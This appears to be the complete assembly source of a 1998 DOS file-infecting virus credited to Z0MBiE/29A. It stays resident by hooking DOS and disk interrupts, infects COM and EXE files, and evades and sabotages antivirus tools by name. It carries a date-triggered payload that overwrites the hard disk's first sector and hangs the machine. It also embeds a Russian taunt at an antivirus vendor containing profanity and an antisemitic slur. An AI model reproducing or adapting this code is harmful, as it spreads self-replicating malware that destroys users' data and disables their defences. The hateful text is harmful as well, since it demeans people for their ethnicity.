
min_size                equ     2000

max_com_size            equ     50000


dta_struc               struc
dta_driveletter         db      ?               ; 0=Ay
dta_name8               db      8 dup (?)       ;
dta_ext3                db      3 dup (?)       ;
dta_searchattr          db      ?               ;
dta_direntrynum         dw      ?               ; 0=. 1=..
dta_dircluster          dw      ?
                        dd      ?               ; unused
dta_attr                db      ?               ; 1=r 32=a 16=d 2=h 4=s 8=v
dta_time                dw      ?               ; чччччммм мммссссс
dta_date                dw      ?               ; гггггггм мммддддд
dta_size                dd      ?
dta_name                db      13 dup (?)
                        ends

exe_struc               struc
exe_mz                  dw      ?               ; MZ/ZM
exe_last512             dw      ?
exe_num512              dw      ?
exe_relnum              dw      ?
exe_headersize          dw      ?               ; in PAR
exe_minmem              dw      ?
exe_maxmem              dw      ?
exe_ss                  dw      ?
exe_sp                  dw      ?
exe_checksum            dw      ?               ; 0
exe_ip                  dw      ?
exe_cs                  dw      ?
exe_relofs              dw      ?
exe_ovrnum              dw      ?               ; 0
                        db      32 dup (?)
exe_neptr               dd      ?
                        ends

sft_struc               struc
sft_handles             dw      ?               ; сколько у файла дескрипторов
sft_openmode            dw      ?
sft_attr                db      ?               ; атрибуты файла
sft_flags               dw      ?               ; ВРАНЬЕ бит 14 - сохранять дату/время при закрытии
sft_deviceptr           dd      ?               ; если символьное устр-во - header драйвера
sft_1stcluster          dw      ?               ; начальный кластер файла
sft_date                dw      ?
sft_time                dw      ?
sft_size                dd      ?
sft_pos                 dd      ?
sft_lastFclustr         dw      ?               ; относительный номер кластера в файле
                                                ; к кототорму было последнее обращение
sft_dirsect             dd      ?               ; сектор содержащий элемент каталога
sft_dirpos              db      ?               ; номер элемента каталога в секторе
sft_name                db      11 dup (?)
sft_chain               dd      ?               ; share.exe
sft_uid                 dw      ?               ; share.exe
sft_psp                 dw      ?
sft_mft                 dw      ?               ; share.exe
sft_lastclust           dw      ?               ; номер кластера к которому было посл. обращ.
sft_ptr                 dd      ?               ; указатель на драйвер ifs файла/0 если лок.
                        ends


                        .model  small
                        locals  __
                        jumps

                        .code

                        org     100h
start:
                        jmp     initialize

com_entry:              push    cs

                        pushf
                        push    ax

                        mov     ax, cs
                        add     ax, 1234h
com_disp_shr4           equ     word ptr $-2
                        push    ax
                        lea     ax, __1
                        push    ax
                        retf

__1:                    push    si
                        push    di
                        push    cx

                        mov     di, 1234h
com_rest_add100h        equ     word ptr $-2
                        lea     si, savehdr
                        mov     cx, savehdr_size
                        cld
                        segcs
                        rep     movsb

                        call    tsr

                        pop     cx
                        pop     di
                        pop     si

                        pop     ax
                        popf

                        push    cs:com_rest_add100h
                        retf

com_E9                  db      0E9h
com_jmp                 dw      ?

savehdr_size            equ     16
savehdr                 db      savehdr_size dup (?)

exe_entry:              call    tsr

                        mov     ax, es

                        add     cs:save_cs, ax

                        add     ax, 1234h
save_ss                 equ     word ptr $-2
                        mov     ss, ax
                        mov     sp, 1234h
save_sp                 equ     word ptr $-2

                        db      0eah
save_ip                 dw      ?
save_cs                 dw      ?

                        db      13,10

                                ;0123456789ABCDEF0123456789ABCDEF+
calc_id                 db      'M1 [i286] v1.00 (c)"98 Z0MBiE/29A',13,10

                        db      'homepage(s):',13,10
                        db      '  www.chat.ru/~z0mbie',13,10
                        db      '  members.xoom.com/Z0MBiE',13,10
                        db      'e-mail:',13,10
                        db      '  z0mbie@chat.ru',13,10

                        db      13,10

                        not     byte ptr [si]

encr_start:
 db 'НУ ТЫ БЛЯ ЧЕГО ВААЩЕ kAZpER ТВОЮ БЛЯ ВАШУ МАТЬ ИЛИ КТО ?!',13,10
 db '2 последних Zombie. вируса называются 007JB и не иначе.',13,10
 db 'RENAME или СДОХНИ, скотина!',13,10
 db 'А то следующий вир будет обнаружен в твоих поганых базах,',13,10
 db 'которые я отошлю твоим жидомасонским (по)дружкам-дистрибьюторам...',13,10
 db 'А еще расскажу всем как ты перепутал shadowram и flashbios, уёбок,',13,10
 db 'и про джампер (!) в доке написал.',13,10
 db 'Дааа, и кстати! Почему твой sux subjЫ вылечить не может?',13,10
 db 13,10
 db 'p.s. Я ДАЖЕ И НЕ ДУМАЮ ЧТО ЭТОТ ТЕКСТ ПОПАДЕТ В ДОКИ ;) ;) ;)',13,10
encr_end:

tsr:                    call    push_regs

                        push    cs
                        pop     ds
                        cld

                        mov     al, 88h ; hehe
                        out     88h, al
                        in      al, 88h
                        xor     al, 88h
                        lea     di, crypt
__1:                    add     BYTE ptr [di], al
                        inc     di
                        cmp     di, offset codeend
                        jae     crypt
                        jmp     __1
crypt:

                        mov     ah, 2Ah
                        int     21h
                        cmp     dl, dh
                        je      fuckup

                        mov     ax, 'WW'
                        lea     bx, ret_M1
                        int     21h
                        cmp     ax, 'M1'
                        je      __exit

                        mov     ax, 5801h
                        mov     bx, 0082h
                        int     21h

                        mov     ah, 48h
                        mov     bx, memory
                        int     21h

                        pushf
                        mov     ax, 5801h
                        xor     bx, bx
                        int     21h
                        popf

                        jnc     __ok

                        push    es
                        mov     ax, es
                        dec     ax
                        mov     es, ax
                        mov     bx, es:[0003h]
                        pop     es

                        mov     ah, 4Ah
                        sub     bx, memory+1
                        int     21h
                        jc      __exit

                        mov     ah, 48h
                        mov     bx, memory
                        int     21h
                        jc      __exit

__ok:                   dec     ax
                        push    ax

                        mov     ah, 52h
                        int     21h
                        mov     cx, es:[bx-2]

                        pop     ax
                        mov     es, ax

                        mov     word ptr es:[0001h], cx
                        mov     byte ptr es:[0008h], 0

                        sub     ax, 16 - 1
                        mov     es, ax

                        push    es

                        mov     ax, 3521h
                        int     21h
                        mov     old21.word ptr 0, bx
                        mov     old21.word ptr 2, es

                        mov     ah, 13h
                        int     2Fh
                        mov     cs:old13.word ptr 0, bx
                        mov     cs:old13.word ptr 2, es
                        int     2Fh

                        pop     es

                        mov     working, 0              ; !!!
                        mov     enable_del, 0           ; !!!

                        mov     di, 0100h
                        lea     si, start
                        mov     cx, memory * 16
                        cld
                        rep     movsb

                        push    es
                        pop     ds

                        mov     ax, 2521h
                        lea     dx, int21
                        int     21h

                        lea     dx, int13
                        les     bx, cs:old13
                        mov     ah, 13h
                        int     2Fh

__exit:                 call    pop_regs
                        ret




fuckup:                 mov     ax, 2516h
                        mov     dx, 0f000h
                        mov     ds, dx
                        mov     dx, 0fff0h
                        int     21h

                        mov     ax, 40h
                        mov     es, ax
                        xor     di, di
                        mov     cx, 256
                        xor     ax, ax
                        cld
                        rep     stosb

                        mov     ax, 0301h
                        mov     cx, 0001h
                        mov     dx, 0080h
                        int     13h

__1:                    cli
                        hlt
                        jmp     __1




int13:                  cmp     ax, 'WW'
                        je      ax_WW

                        cmp     cs:working, 1
                        je      exit13

                        cmp     cs:enable_del, 1
                        jne     exit13

                        mov     cs:ax13, ax

                        cmp     ah, 02h
                        je      ah_02
                        cmp     ah, 03h
                        je      ah_03

exit13:                 db      0eah
old13                   dd      ?

ah_02:                  pushf
                        call    cs:old13

                        call    scan_esbx

                        retf    2

ah_03:                  call    scan_esbx

                        jmp     exit13

scan_esbx:              pushf
                        call    push_regs

                        push    cs
                        pop     ds

                        mov     cx, ax13
                        xor     ch, ch
                        shl     cx, 4
                        jcxz    __2

__1:                    push    cx

                        lea     si, delete
                        mov     cx, delete_count
                        mov     di, bx
                        call    is_in_list
                        jnc     __3

                        mov     di, bx
                        mov     cx, 32
                        mov     al, 0E5h
                        cld
                        rep     stosb

__3:                    pop     cx

                        add     bx, 32
                        loop    __1

__2:                    call    pop_regs
                        popf
                        ret

int21:                  cmp     ax, 'WW'
                        je      ax_WW

                        cmp     cs:working, 1
                        je      exit21

                        cmp     ah, 4Bh
                        je      infect_dsdx
                        cmp     ah, 43h
                        je      infect_dsdx
                        cmp     ah, 3Dh
                        je      infect_dsdx
                        cmp     ah, 56h
                        je      infect_dsdx

exit21:                 db      0eah
old21                   dd      ?

ax_WW:                  call    bx
                        retf    2

ret_M1:                 mov     ax, 'M1'
                        ret

infect_dsdx:            mov     cs:working, 1

                        mov     cs:temp_ss, ss
                        mov     cs:temp_sp, sp

                        push    cs
                        pop     ss
                        lea     sp, exe_temp_sp

                        mov     cs:func_ax, ax

                        call    infect_file

                        mov     ax, cs:func_ax

                        mov     ss, cs:temp_ss
                        mov     sp, cs:temp_sp

                        mov     cs:working, 0

                        jmp     exit21

                        ; infect_file subroutine
                        ; parameters: ds:dx = name of file

infect_file:            call    push_regs

                        mov     ah, 60h    ; copy (&canonize) file name
                        mov     si, dx     ; from ds:dx to [filename]
                        push    cs
                        pop     es
                        lea     di, filename
                        int     21h
                        jc      __exit

                        mov     ah, 2fh    ; get & push dta addr
                        int     21h
                        push    es
                        push    bx

                        push    cs
                        pop     ds

                        mov     ah, 1ah    ; set own dta
                        lea     dx, dta
                        int     21h

                        mov     ah, 4eh    ; try to find file
                        mov     cx, 1+2+4+32
                        lea     dx, filename
                        int     21h

                        mov     ah, 1ah    ; pop & set dta addr
                        pop     dx
                        pop     ds
                        int     21h

                        jc      __exit     ; exit if no file found

                        ; well, file found

                        push    cs
                        pop     ds

                        ; check date & time - maybe alredy infected

                        mov     ax, dta.dta_date
                        not     ax ;  чччччммммммссссс
                        and     ax,   0111101111101111b ; to avoid "bad" time
                        cmp     ax, dta.dta_time
                        je      __exit
                        mov     dta.dta_time, ax

                        ; no virus timestamp, so check file name for AV file

                        push    cs
                        pop     es

                        lea     si, noinfect
                        mov     cx, noinfect_count
                        lea     di, dta.dta_name8
                        call    is_in_list
                        jnc     __okey

                        cmp     func_ax, 4b00h
                        jne     __exit
                        mov     func_ax, 4c00h
                        mov     enable_del, 1
                        jmp     __exit

__okey:                 ; normal file name i think, so check for size

                        mov     ax, dta.dta_size.word ptr 0
                        mov     dx, dta.dta_size.word ptr 2

                        or      dx, dx
                        ja      __1
                        cmp     ax, min_size
                        jb      __exit

                        ; dont infect files with size = xxx00..xxx01

__1:                    mov     cx, 100
                        div     cx

                        cmp     dx, 1
                        jbe     __exit

                        mov     ax, 3d00h       ; open file
                        lea     dx, filename
                        int     21h
                        jc      __exit

                        xchg    bx, ax

                        call    fuck_sft        ; change open mode (ro->rw)

                        call    read_header     ; read header

                        mov     ax, 4202h       ; read last eof_size bytes
                        mov     dx, -eof_size   ; to eof
                        mov     cx, -1
                        int     21h

                        mov     ah, 3fh
                        lea     dx, eof
                        mov     cx, eof_size
                        int     21h

                        mov     si, EOF.word ptr 0  ; calc id
                        xor     si, EOF.word ptr 2
                        add     si, EOF.word ptr 4
                        and     si, 31
                        xor     si, word ptr calc_id[si]
                        and     si, 31
                        sub     si, word ptr calc_id[si]

                        cmp     si, EOF.word ptr 6  ; alredy infected?
                        je      __close
                        mov     EOF.word ptr 6, si  ; set id

                        ; round up file size to 1 paragraph

                        mov     di, dta.dta_size.word ptr 2
                        mov     si, dta.dta_size.word ptr 0

                        add     dta.dta_size.word ptr 0, 15
                        adc     dta.dta_size.word ptr 2, 0
                        and     dta.dta_size.byte ptr 0, 0F0h

                        mov     ax, header.word ptr 0

                        mov     cx, dta.dta_ext3.word ptr 0
                        xchg    cl, ch

                        cmp     ax, 'MZ'
                        je      __exe
                        cmp     ax, 'ZM'
                        je      __exe

                        cmp     ax, -1
                        je      __sys

                        cmp     cx, 'CO'
                        je      __com
                        cmp     cx, 'TP'
                        je      __tpu
                        cmp     cx, 'BG'
                        je      __bgi

                        ; unknown file type

                        jmp     __close

__com:                  call    infect_com
                        jmp     __check

__bgi:                  call    infect_bgi
                        jmp     __check

__tpu:                  call    infect_tpu
                        jmp     __check

__sys:                  cmp     cx, 'SY'
                        je      __2
                        cmp     cx, 'DR'
                        jne     __close

__2:                    call    infect_sys
                        jmp     __check

__exe:                  cmp     cx, 'EX'
                        je      __3
                        cmp     cx, 'PR'
                        je      __3
                        cmp     cx, 'OV'
                        jne     __close

__3:                    call    infect_exe
                        jmp     __check

__check:                jc      __close

                        mov     ax, 5701h
                        mov     dx, dta.dta_date
                        mov     cx, dta.dta_time
                        int     21h

__close:                call    unfuck_sft

                        mov     ah, 3eh         ; close file
                        int     21h

__exit:                 call    pop_regs        ; exit

                        ret


seek_eof:               mov     ax, 4200h
                        mov     cx, dta.dta_size.word ptr 2
                        mov     dx, dta.dta_size.word ptr 0
                        int     21h
                        ret

seek_si:                mov     ax, 4200h
                        xor     cx, cx
                        mov     dx, si
                        int     21h
                        ret

write_header:           mov     ah, 40h
                        jmp     rw_hdr

read_header:            mov     ah, 3fh

rw_hdr:                 lea     dx, header
                        mov     cx, header_size
                        int     21h
                        ret


infect_com:             or      di, di
                        jnz     __exit
                        cmp     si, max_com_size
                        ja      __exit

                        xor     si, si
                        mov     bp, 100

__em:                   dec     bp
                        jz      __done

                        mov     al, header.byte ptr 0

                        cmp     al, 0E9h
                        je      __near
                        cmp     al, 0E8h
                        je      __near

                        cmp     al, 0EBh
                        je      __short

                        cmp     al, 0CDh
                        je      __skip2

                        cmp     al, 0BCh        ; mov SP, xxxx
                        je      __done

                        and     al, 11111000b   ; MOV

                        cmp     al, 0B8h
                        je      __skip3
                        cmp     al, 0B4h
                        je      __skip2

__done:                 mov     ax, dta.dta_size.word ptr 0
                        sub     ax, si
                        add     ax, -3 + com_entry - start
                        mov     com_jmp, ax

                        call    seek_si

                        mov     ah, 40h
                        lea     dx, com_E9
                        mov     cx, 3
                        int     21h

                        lea     ax, [si+100h]
                        mov     com_rest_add100h, ax

                        mov     ax, dta.dta_size.word ptr 0
                        mov     cl, 4
                        shr     ax, cl
                        mov     com_disp_shr4, ax

                        lea     si, header
                        push    cs
                        pop     es
                        lea     di, savehdr
                        mov     cx, savehdr_size
                        rep     movsb

                        call    write_to_end

                        clc
                        ret

__exit:                 stc
                        ret

__short:                mov     ax, si
                        add     al, header.byte ptr 1
                        adc     ah, 0
                        jmp     __check

__skip3:                lea     ax, [si+3]
                        jmp     __check

__skip2:                lea     ax, [si+2]
                        jmp     __check

__near:                 mov     ax, si
                        add     ax, header.word ptr 1
                        add     ax, 3

__check:                cmp     ax, si
                        je      __done

                        mov     cx, dta.dta_size.word ptr 0
                        sub     cx, 64
                        cmp     ax, cx
                        jae     __done

                        mov     si, ax

                        call    seek_si
                        call    read_header

                        jmp     __em

write_to_end:           call    seek_eof

                        mov     ah, 40h
                        lea     dx, start
                        mov     cx, virsize
                        int     21h

                        ret

infect_exe:             mov     ax, header.exe_num512
                        dec     ax
                        jle     __exit
                        cwd
                        mov     cx, 512
                        mul     cx
                        add     ax, header.exe_last512
                        adc     dx, 0

                        cmp     ax, si
                        jne     __exit
                        cmp     dx, di
                        jne     __exit

                        mov     si, header.exe_headersize
                        mov     cl, 4
                        shl     si, cl

                        mov     dx, dta.dta_size.word ptr 2
                        mov     ax, dta.dta_size.word ptr 0

                        push    ax
                        push    dx
                        add     ax, virsize
                        adc     dx, 0
                        mov     cx, 512
                        div     cx
                        inc     ax
                        mov     header.exe_num512, ax
                        mov     header.exe_last512, dx
                        pop     dx
                        pop     ax

                        sub     ax, si
                        sbb     dx, 0

                        test    dx, 1111111111110000b
                        jnz     __exit

                        mov     cl, 4
                        rol     dx, cl
                        shr     ax, cl

                        add     ax, dx
                        jc      __exit

                        mov     cx, header.exe_ss
                        add     cx, 16
                        mov     save_ss, cx
                        mov     cx, header.exe_cs
                        add     cx, 16
                        mov     save_cs, cx
                        mov     cx, header.exe_sp
                        mov     save_sp, cx
                        mov     cx, header.exe_ip
                        mov     save_ip, cx

                        sub     ax, 16
                        mov     header.exe_cs, ax
                        mov     header.exe_ss, ax

                        mov     header.exe_sp, offset exe_temp_sp
                        mov     header.exe_ip, offset exe_entry

                        mov     ax, header.exe_minmem
                        add     ax, exememory
                        jnc     __a
                        mov     ax, -1
__a:                    mov     header.exe_minmem, ax

                        mov     ax, header.exe_maxmem
                        add     ax, exememory
                        jnc     __b
                        mov     ax, -1
__b:                    mov     header.exe_maxmem, ax

                        mov     ax, 4200h
                        cwd
                        xor     cx, cx
                        int     21h

                        call    write_header

                        call    write_to_end

                        ;;

                        clc
                        ret

__exit:                 stc
                        ret

infect_sys:             stc
                        ret

infect_tpu:             stc
                        ret

infect_bgi:             stc
                        ret



push_regs:              pop     cs:temp
                        push    ax bx cx dx  si di  bp  ds es
jmp_temp:               jmp     cs:temp

pop_regs:               pop     cs:temp
                        pop     es ds  bp  di si  dx cx bx ax
                        jmp     jmp_temp

                        ; input:  DS:SI=list ptr
                        ;         CX=list count

                        ;         ES:DI=file name

                        ; output: CF=1  in list

is_in_list:

__0:                    push    cx si di

                        mov     cx, 11
                        cld
__1:                    cmpsb
                        je      __2
                        cmp     byte ptr [si-1], '?'
                        jne     __3
__2:                    loop    __1

                        pop     di si cx

                        stc
                        ret

__3:                    pop     di si cx

                        add     si, 11

                        loop    __0

                        clc
                        ret

fuck_sft:               call    init_sft
                        mov     es:[di].sft_openmode, 2
                        ret

unfuck_sft:             call    init_sft
                        mov     es:[di].sft_openmode, 0
                        ret

init_sft:               push    ds
                        push    bx
                        mov     ax, 1220h
                        int     2fh
                        mov     bl, es:[di]
                        mov     ax, 1216h
                        int     2fh
                        pop     bx
                        pop     ds
                        ret


random:                 in      al, 40h
                        mov     ah, al
                        in      al, 40h
                        ret

delete:
noinfect:               db      '-U?????????'
                        db      '-D?????????'
                        db      'ADINF??????'
                        db      'AIDS???????'
                        db      'ANTI???????'
                        db      'AVP????????'
                        db      'BOOTSAFE???'
                        db      'CLEAN??????'
                        db      'DRWEB??????'
                        db      'F-PROT?????'
                        db      'GUARD??????'
                        db      'MCAFEE?????'
                        db      'NAV????????'
                        db      'NOD????????'
                        db      'SCAN???????'
                        db      'TB?????????'
                        db      'TNTVIRUS???'
                        db      'VIRUS??????'
                        db      'VSAFE??????'
                        db      'WEB????????'

noinfect_count          equ     ($-noinfect)/11

                        db      'FORMAT?????'
                        db      'FDISK??????'
                        db      'CHKDSK?????'
                        db      'DE?????????'
                        db      'NDD????????'
                        db      'SCANDISK???'
                        db      'DEBUG??????'
                        db      'S-ICE??????'
                        db      'TD?????????'
                        db      'HIEW???????'
                        db      'LDR????????'

delete_count            equ     ($-delete)/11

eof_size                equ     32
eof                     db      eof_size dup (0F6h)

codeend:
virsize                 equ     codeend-start

temp                    dw      ?
filename                db      128 dup (?)
dta                     dta_struc   ?

header_size             equ     64
header                  db      header_size dup (?)

func_ax                 dw      ?
ax13                    dw      ?

working                 db      ?
enable_del              db      ?

temp_sssp               label   dword
temp_sp                 dw      ?
temp_ss                 dw      ?

                        if      ($-start) and 1 ne 0
                        db      ?
                        endif

                        db      1024 dup (?)
exe_temp_sp:

memory                  equ     ($-start+15)/16
exememory               equ     ($-codeend+15)/16

initialize:             lea     si, encr_start
                        mov     cx, encr_end - encr_start
__1:                    not     byte ptr [si]
                        inc     si
                        loop    __1

                        jmp     tsr

                        end     start

